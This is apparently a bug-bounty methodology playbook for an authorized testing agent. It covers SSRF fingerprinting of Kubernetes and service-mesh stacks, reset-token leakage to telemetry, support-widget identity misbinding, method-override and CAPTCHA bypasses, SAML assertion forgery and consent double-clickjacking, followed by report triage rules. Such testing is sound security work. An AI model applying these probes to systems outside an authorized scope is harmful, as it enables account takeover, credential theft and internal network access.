1. **Fingerprint through your own listener first [G2]:** point the SSRF at an echo endpoint/OAST listener you control. Inspect what the *server's* request carries — injected headers reveal the internal stack: `x-envoy-peer-metadata` / `x-envoy-peer-metadata-id` (Istio/Envoy sidecar, format `sidecar~<podIP>~<podName>.<namespace>.svc.cluster.local` leaks pod IP, name, namespace), `x-b3-*`/`x-request-id` chains, `via`, `server`, proxy identifying headers.
2. **Read the full response for architecture leaks [G2]:** error bodies, `X-*` headers, and naming conventions in fetched internal URLs fingerprint the platform — `*.svc.cluster.local` naming → Kubernetes; `169.254.169.254` answering → cloud IMDS; `consul.`/`vault.` DNS → HashiCorp stack; kubelet endpoints → direct node access.
3. **Route by naming convention, not payload lists [G3]:** once the stack is fingerprinted, derive internal service names from the leaked conventions and hit read-only endpoints — `http://<podIP>:10255/pods` (kubelet read-only port), cluster DNS names reconstructed from the sidecar metadata. Documented capability, not enumeration.
4. **Prove, then stop [G3]:** for endpoints carrying destructive capability (shutdown/admin/monitoring write paths), document the *exposed* capability with a read-level request and state it in the report — never exercise the destructive action. CIA impact is proven by exposure + reach, not by taking production down.
5. **Error-reflection channels (PB-9 extension):** any user string rendered into a server-side renderer (PDF/CSV/image/doc pipelines) is an HTML-injection candidate → `<iframe>`/`fetch` payloads fire the fetch from the renderer's network position, which differs from the app's.

**FP-rule refinement:** a plain OAST callback with no internal reachability is Medium at best — the report needs the internal-response artifact (decoded mesh header + an internal body or status). A fetch that only reaches your own public listener proves egress, not internal SSRF. Reporting "HTML survived into a PDF" without the server-side fetch proof is the documented reject shape.

## PB-16 — Token and credential leakage to telemetry and third-party surfaces

**When it applies:** flows that place secrets in URLs or client-visible state (password reset, magic links, email verification, OAuth callbacks, invite acceptance), plus leaked-credential findings of any class — where the proof question is always "does this secret reach somewhere it shouldn't, and does it still work".

**Provenance:** H1-4000185 (Segment) and H1-4071670 (Datadog RUM), Sep–Oct 2026 — live reset tokens recorded into vendor telemetry; moblig's $15k stale-token/PII case (Mar 2025); the Google-VRP Eclipse Referer-leak case and voorivex limited-HTMLi→code-exfil work (2025).

### Expanded method

1. **Token-in-URL inventory [G2]:** every flow minting a bearer secret — reset links, verify links, OAuth `code`/`token` params, invite tokens. Record where the token lands: URL path, query param, fragment (fragments don't hit Referer; query params do).
2. **Telemetry-sink check [G2]:** on pages holding a live token, enumerate the page's SDK calls — Datadog RUM, Segment, GA, Intercom, NewRelic, Sentry. Look for `view.url`/`page.url`/`session replay` payloads recording the full URL verbatim at high sample rates with no `beforeSend` redaction. The oracle is the token + a same-session identity field (`anonymousId`, `session_id`, email) appearing together in the telemetry payload while the token still redeems.
3. **Referer-channel check [G2]:** any subresource fetch (img, font, analytics pixel) from the token-bearing page sends `Referer` — a page allowing attacker-controlled images (`referrerpolicy="unsafe-url"`, limited HTMLi) leaks the full URL incl. `code`. Chrome <131 honored the attribute explicitly (CVE-2024-11110).
4. **Stale-token replay [G2]:** multi-step flows (applications, onboarding, signups) minting tokens without expiry/rotation — replay the token days later against the authenticated step; also check indexed-token dorking for the parameter name.
5. **Credential classification before reporting [G2]:** every key-shaped value gets sorted first — publishable (Stripe `pk_`, Supabase publishable, analytics tokens, Google API client keys: not a finding) vs private (unlocks data/actions a visitor can't reach: finding, and the report shows what it unlocked — see `../../reporter` reportability gate q3). Unvalidated key-shaped strings and already-flagged secret-scanning hits are rejected on sight; test once to authenticate, deauthenticate, never exercise beyond the first proof.

**Evidence bar:** the telemetry payload (or Referer log on your listener) containing the live token + the pairing identity field, and the token's redemption at the legitimate endpoint — both halves, on your own accounts.

**FP-rule refinement:** token-in-URL alone without a live sink is informational; an expired or self-scoped token replaying is informational; a leaked credential that unlocks nothing extra is a note. Pairing is the finding — secret plus a working sink or a demonstrated unlock.

## PB-17 — Session and auth edge cases: identity proxies, method override, captcha-verify trust

**When it applies:** authenticated surfaces fronted by third-party widgets (chat/support), API gateways, or CAPTCHA gates — the failure mode is a check that exists but binds to the wrong thing.

**Provenance:** Intercom identity-misconfiguration writeups (19whoami19 Sep 2025; nuclei template `intercom-identity-misconfiguration`); ESPv2 CVE-2023-30845 method-override pattern (Bug Bytes #231, 2026); the P2 Turnstile-bypass→AI-agent-access case (akashmotkar001, 2026); double-clickjacking consent work — WakaTime H1-3287060 (Aug 2025) and Sentry's 1s Approve-delay fix (Mar 2026).

### Expanded method

1. **Third-party identity widgets [G2]:** support/chat widgets bootstrap identity from `user_data.email` (Intercom `boot`, `api-iam.intercom.io/messenger/web/ping`). Probe whether `user_hash`/`intercom_user_jwt` is enforced: boot with a victim-shaped email — a `Missing user_hash` error means configured; chat history loading means you just read another user's support transcript as them.
2. **HTTP method-override at gateways [G2]:** on gateway-fronted APIs, send an undefined-method request plus `X-HTTP-Method-Override: <spec'd method>` (also `_method`, `X-HTTP-Method`) — gateway route-matches the overridden method while the JWT/auth filter already skipped it. Also fuzz PUT/DELETE/PATCH/HEAD on GET-only authed routes. Oracle: 200-with-data vs the 401 baseline.
3. **CAPTCHA-verify endpoint trust [G2]:** find the verification endpoint/event (`captcha_verify` WS event, form submit backends). Send empty, missing, whitespace, garbage tokens — `{"success":true}` for all = no server-side check. Behind the gate, inventory what unlocks (agent access, prompt/tool-schema disclosure is itself a chain — pairs with PB-2).
4. **SAML subject-binding [G2, G3 for forgery]:** three probes — (a) swap NameID/email inside your own valid signed assertion → SP verifies signature but not subject-to-account binding (cross-org ATO); (b) present SP-A's assertion to SP-B → missing AudienceRestriction (ZITADEL GHSA-x4c7-fpcx-w9q6); (c) parser differentials — duplicate namespace attrs, or wrap any IdP-signed XML doc around a forged assertion (PortSwigger "SAML Roulette"/"The Fragile Lock", Dec 2025). Oracle is a session minted as the victim.
5. **Double-clickjacking on consent [G3]:** XFO blocks iframes but not popups — position a consent window's Authorize button under the victim's cursor across a scripted double-click (click 1 closes the decoy, click 2 authorizes). Oracle: screen-recorded PoC + the code redeemed.

**FP-rule refinement:** a 200 on the ping endpoint alone proves nothing — the vulnerability is the *missing binding*, shown by victim-email data loading. Signed-but-misbound assertions need the working forged-session PoC; XSW theory without it gets rejected. Console-paste/self-scoped demos fail the `../../reporter` gate.

---

# PART 2 — REPORT-QUALITY TRIAGE & PROGRAM-SCOPE DETAIL

Owner-audit reporting (`../../reporter`) remains the default output; this section supplies the triage-facing layer for bounty-program engagements. The report-quality gate in `../../reporter` is the gate; this section is the depth. The harm gate (`../../reporter`) runs FIRST: a finding must clear the seven reportability questions before the seven quality questions mean anything.

## The seven report-quality questions — scoring notes

1. **Description** — precise vulnerability behavior, not symptom or scanner label; a vague description forces triage to guess, and guessing lands Low.
2. **Preconditions** — state every precondition and eliminate the avoidable ones from the proof design; each remaining precondition (prior access, victim interaction, uncommon configuration, high-entropy IDs) steps most program rewards down one rung.
3. **Impact** — succinct and product-specific; "theoretical or speculative impact" lands Low; "no PoC" is a non-qualifying category — demonstrated impact wins regardless of prose volume (a one-word impact section plus a demonstrated credential leak earned $25,000 in the H1-2262382 case).
4. **Reproduction steps** — complete enough to re-run without follow-up; attach full request/response pairs — "or triage cannot reproduce" (the sibling-reporter warning in the Facebook race case).
5. **Target information** — product, version, hostnames, exact asset; the impact tier follows the root-cause component, so target info must identify it.
6. **Reproduction output** — raw responses, fuzzer/debugger output, timing/order data for concurrency findings, exact tool/engine configs.
7. **Responsiveness** — Google VRP scores <3-workday responsiveness as a scored dimension; enterprise programs vary but slow responses stall payouts (the Slack SAML case: next-day confirmation, ~6 months to close).

**Pre-triage freeze:** rules state only information available before triage is considered — completeness of the first submission outranks excellent later additions.

## Chain-aggregation rule (full statement)

- **Trigger:** two or more independently LOW or INFORMATIONAL findings whose combination produces a higher-severity outcome.
- **Demonstration requirement:** the chain itself must be demonstrated end-to-end with owned resources (five low OAuth flaws chained into private-repo takeover; CAPTCHA bypass + privileged-event disclosure as one kill chain). Links that were not exercised are classified Supported but not fully validated or Hypothetical per the outcome classes in `verification.md` — explicitly, in the report.
- **Severity argument:** from the demonstrated chain impact, never the sum of component severities; component severities do not add.
- **Structure:** one chain narrative; components listed separately with their own evidence; components stay individually reportable only if the program prefers component reports — do not double-report both forms.
- **The attack-path analysis worker (see `../../orchestrator`) owns the aggregation**; the outcome classes in `verification.md` govern each link's classification.

## Duplicate-avoidance procedure

1. Screen the program's known-issues repository and 'Fix pending' lists before testing (root-cause overlap disqualifies even with different symptoms).
2. Screen published audit reports and contest findings.
3. Screen past-bounty pages and any previously-reported index ("Issues already known to the Safe team or previously reported are not eligible").
4. For platform programs, screen the program's disclosed-report archive for the same root cause.
5. Record the screening result in the finding record — it is part of the scope-proof.

## Severity argumentation per program matrix

- **Impact-led, not class-led:** pay scales follow what the victim loses (silent message spoofing = "a trust failure, not a cosmetic bug"; a confirmed-but-uncontrolled identity flag breaks recovery flows; UX-only fund-adjacent behavior pays 1% of fund-loss tiers).
- **Cite public norm text where it exists:** RFC 9700 §2.3 for token-audience confusion; RFC 6749 §4.1.2/§4.1.3 for code binding; the provider's own documentation for redirect-matching and PKCE warnings; the SAML Profiles replay-detection requirement.
- **Map to the program taxonomy:** a finding must map to the program's impact examples to be payable (Safe's four examples); for platform programs use HackerOne/Bugcrowd VRT where applicable and CWE for root cause; use the program's own severity matrix as the argument frame.
- **Demonstrated vs plausible, in writing:** state what you showed (the insecure sink, the accepted assertion, the redeemed artifact) and what is plausible (the model-dependent chain, the mobile-login path); make precise non-claims (did NOT access real customer devices/feeds/recordings; did NOT measure cost amplification).
- **Scope-proof ships with the report:** the program-policy line permitting credential-, concurrency-, or auth-bypass-class techniques must accompany the evidence — "or the report is dead on triage". The safety gates (`../../safety-gates`) still prohibit credential brute-forcing on live targets regardless of program policy; where the technique is prohibited by the gates, report the limiter weakness with a harmless-operation demonstration and a lab reference.
- **Remediation expectations:** note known patterns (next-day confirmation + ~6-month close for enterprise SSO; ~14-hour fix when the impact proof was minimal and reversible) so triage and reporter expectations align.

## Program-scope awareness — intake procedure

1. **Extract the rules first** (PB-11 pattern for JS-gated pages). Never invent a rule you could not read — if a commonly-cited rule cannot be found in the source, record it as absent rather than assumed (the Safe "gate-question list" is the worked example of this discipline).
2. **Read all program tabs** (/information/, /scope/, /resources/) plus routing tables (contract vs web/wallet channels).
3. **Read the exclusion list before testing:** known-issues repos, audit reports, contest findings, past bounties.
4. **Identify the reward table and downgrade ladder** and design the proof against them.
5. **Identify hard stops** as scope boundaries (Borg for Google VRP; customer-space exclusions; mainnet prohibitions for contract programs).
6. **Identify submission plumbing:** platform + form, PGP key for sensitive details, payment-address requirements, anonymous-submission policy.
7. **DeFi/DEX custom-pricing liquidity pools:** the named Critical/High targets are usually the oracle trust boundary and the pricing math — see PB-10 for the full family (band/staleness, in-bin step math, fee caps/timelocks, role reachability, storage alignment, extension hooks, router settlement); remember the intended-behavior exclusions (stale-feed halts, MEV within slippage/deadline, rounding dust).

## Boundary

Submission is always a researcher decision. The safety gates (`../../safety-gates`) prohibit automatic submission to third parties; the triage gate prepares the report, it does not send it. All testing remains inside the G0–G3 gates and the stop conditions defined in `../../safety-gates`.
